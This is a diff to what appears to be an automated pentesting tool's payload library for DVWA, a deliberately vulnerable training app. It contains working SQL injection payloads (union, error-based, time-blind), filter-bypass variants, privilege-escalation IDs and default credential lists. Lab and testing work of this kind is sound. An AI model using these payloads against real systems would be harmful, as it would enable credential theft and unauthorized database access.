@@ -27,7 +27,7 @@ class PayloadLibrary:
 
     _PAYLOAD_DB: dict[str, PayloadSet] = {
         "sqli_union": PayloadSet(
-            probe=["1' ORDER BY 1-- -", "1' ORDER BY 2-- -", "1' UNION SELECT null-- -"],
+            probe=["1' ORDER BY 1-- -", "1' ORDER BY 2-- -", "1' UNION SELECT null,null-- -"],
             exploit=["1' UNION SELECT user,password FROM users-- -"],
             bypass={
                 "medium": ["1 UNION SELECT user,password FROM users#"],
@@ -35,7 +35,7 @@ class PayloadLibrary:
             },
         ),
         "sqli_error": PayloadSet(
-            probe=["1'", "1''", "1\""],
+            probe=["1'", "1''", "1\\'"],
             exploit=["1' AND extractvalue(1,concat(0x7e,(SELECT database())))-- -",
                      "1' AND 1=0 UNION SELECT null,concat(user,0x3a,password) FROM users-- -"],
             bypass={
@@ -54,7 +54,10 @@ class PayloadLibrary:
         ),
         "sqli_time_blind": PayloadSet(
             probe=["1' AND SLEEP(3)-- -"],
-            exploit=["1' AND IF(ASCII(SUBSTR(database(),1,1))>77,SLEEP(3),0)-- -"],
+            exploit=[
+                "1' AND IF(ASCII(SUBSTR(database(),1,1))>77,SLEEP(3),0)-- -",
+                "1' AND IF(ASCII(SUBSTR(database(),1,1))>100,SLEEP(3),0)-- -",
+            ],
             bypass={
                 "medium": ["1 AND SLEEP(3)#"],
                 "high": ["1'/**/AND/**/SLEEP(3)-- -"],
@@ -70,10 +73,10 @@ class PayloadLibrary:
         ),
         "ac_vertical_escalation": PayloadSet(
             probe=["1", "2"],
-            exploit=["1", "1"],
+            exploit=["1", "2", "3"],
             bypass={
-                "medium": ["1"],
-                "high": ["1"],
+                "medium": ["1", "2"],
+                "high": ["1", "2", "3"],
             },
         ),
         "ac_force_browse": PayloadSet(
@@ -84,8 +87,12 @@ class PayloadLibrary:
                 "high": ["setup.php"],
             },
         ),
+        # NOTE: bf_dictionary, bf_spray, and ac_force_browse have identical
+        # bypass payloads across all security levels because DVWA does not
+        # implement encoding-based bypasses for brute-force or force-browse.
+        # High-level CAPTCHA is a documented scope boundary (AGENTS.md).
         "bf_dictionary": PayloadSet(
-            probe=["admin:password", "admin:admin"],
+            probe=["rate_test:test", "probe:probe"],
             exploit=["admin:password", "gordonb:abc123", "pablo:letmein", "smithy:password"],
             bypass={
                 "medium": ["admin:password"],
@@ -93,7 +100,7 @@ class PayloadLibrary:
             },
         ),
         "bf_spray": PayloadSet(
-            probe=["admin:password", "1337:charley"],
+            probe=["rate_test:test", "probe:probe"],
             exploit=["admin:password", "gordonb:abc123", "pablo:letmein", "1337:charley"],
             bypass={
                 "medium": ["admin:password"],
